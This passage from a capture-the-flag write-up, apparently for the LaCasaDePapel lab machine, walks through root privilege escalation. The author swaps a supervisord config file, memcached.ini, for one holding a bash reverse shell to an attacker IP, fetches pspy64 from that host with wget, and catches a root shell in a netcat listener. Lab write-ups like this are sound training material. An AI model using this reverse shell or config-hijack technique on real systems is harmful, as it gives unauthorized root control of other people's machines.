lacasadepapel [~]$ ls -la
total 24
drwxr-sr-x    4 professo professo      4096 Mar  6  2019 .
drwxr-xr-x    7 root     root          4096 Feb 16  2019 ..
lrwxrwxrwx    1 root     professo         9 Nov  6  2018 .ash_history -> /dev/null
drwx------    2 professo professo      4096 Jan 31  2019 .ssh
-rw-r--r--    1 root     root            88 Jan 29  2019 memcached.ini
-rw-r-----    1 root     nobody         434 Jan 29  2019 memcached.js
drwxr-sr-x    9 root     professo      4096 Jan 29  2019 node_modules
lacasadepapel [~]$ cat memcached.ini 
[program:memcached]
command = sudo -u nobody /usr/bin/node /home/professor/memcached.js
```

Checking process with ```ps aux```,

```c
lacasadepapel [~]$ ps aux
PID   USER     TIME  COMMAND

...

10739 root      0:00 {supervisord} /usr/bin/python2 /usr/bin/supervisord --nodaemon --pidfile /var/run/supervisord.pid --configuration /etc/super
10747 nobody    0:05 /usr/bin/node /home/professor/memcached.js
```

On recently called process, there is the content of ```memcached.ini``` and ```supervisord``` is also being used

```supervisord``` is similar to ```cronjobs``` used to automated tasks in linux

Lets try to gather architecture information of this machine so that we can use ```pspy``` to trace the process

```c
lacasadepapel [~]$ uname -a
Linux lacasadepapel 4.14.78-0-virt #1-Alpine SMP Tue Oct 23 11:43:38 UTC 2018 x86_64 Linux
lacasadepapel [~]$ wget http://10.10.14.8:4545/pspy64
Connecting to 10.10.14.8:4545 (10.10.14.8:4545)
pspy64               100% |**************************************************************************************************| 3006k  0:00:00 ETA
lacasadepapel [~]$ chmod +x pspy64 
```

Running ```pspy64```,

```c
lacasadepapel [~]$ ./pspy64 -f

...

2021/09/15 11:37:02 FS:                 OPEN | /etc/supervisord.conf
2021/09/15 11:37:02 FS:               ACCESS | /etc/supervisord.conf
2021/09/15 11:37:02 FS:             OPEN DIR | /home/professor
2021/09/15 11:37:02 FS:             OPEN DIR | /home/professor/
2021/09/15 11:37:02 FS:           ACCESS DIR | /home/professor
2021/09/15 11:37:02 FS:           ACCESS DIR | /home/professor/
2021/09/15 11:37:02 FS:           ACCESS DIR | /home/professor
2021/09/15 11:37:02 FS:           ACCESS DIR | /home/professor/
2021/09/15 11:37:02 FS:    CLOSE_NOWRITE DIR | /home/professor
2021/09/15 11:37:02 FS:    CLOSE_NOWRITE DIR | /home/professor/
2021/09/15 11:37:02 FS:                 OPEN | /home/professor/memcached.ini
2021/09/15 11:37:02 FS:               ACCESS | /home/professor/memcached.ini
2021/09/15 11:37:02 FS:        CLOSE_NOWRITE | /home/professor/memcached.ini
```

It is confirmed that, ```memcached.ini``` is used by ```supervisord```

If we try to modify the content in ```memcached.ini```, we can use it to gain ```reverse shell``` with ```root``` level privilege, because ```supervisord``` runs as root

By seeing the file permissions,

```c
lacasadepapel [~]$ ls -la
total 3032
drwxr-sr-x    4 professo professo      4096 Sep 15 11:36 .
drwxr-xr-x    7 root     root          4096 Feb 16  2019 ..
lrwxrwxrwx    1 root     professo         9 Nov  6  2018 .ash_history -> /dev/null
drwx------    2 professo professo      4096 Jan 31  2019 .ssh
-rw-r--r--    1 root     root            88 Jan 29  2019 memcached.ini
-rw-r-----    1 root     nobody         434 Jan 29  2019 memcached.js
drwxr-sr-x    9 root     professo      4096 Jan 29  2019 node_modules
-rwxr-xr-x    1 professo professo   3078592 Sep 15 11:36 pspy64
lacasadepapel [~]$ ls -ld .
drwxr-sr-x    4 professo professo      4096 Sep 15 11:36 .
```

```memcached.ini``` is owned by ```root```, but the directory is owned by ```professor```

We cannot edit the file, but we can remove it with a prompt

```c
lacasadepapel [~]$ mv memcached.ini /tmp
lacasadepapel [~]$ echo -e "[program:memcached]\ncommand = bash -c 'bash -i  >& /dev/tcp/10.10.14.8/6868 0>&1'" > memcached.ini
lacasadepapel [~]$ cat memcached.ini 
[program:memcached]
command = bash -c 'bash -i  >& /dev/tcp/10.10.14.8/6868 0>&1'
```

After placing our ```bash oneliner reverse shell``` inside ```memcached.ini```, just patiently wait for the time until ```supervisord``` attempts to run it

When it triggers, it will spawn a reverse shell with ```root``` level privilege in our ```netcat``` listener

```c
┌──(aidenpearce369㉿aidenpearce369)-[~]
└─$ nc -nlvp 6868       
listening on [any] 6868 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.131] 42774
bash: cannot set terminal process group (11868): Not a tty
bash: no job control in this shell
bash-4.4# whoami
whoami
root
bash-4.4# id
id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
bash-4.4# cat /root/root.txt
cat /root/root.txt
<---ROOT FLAG--->
bash-4.4# 
```
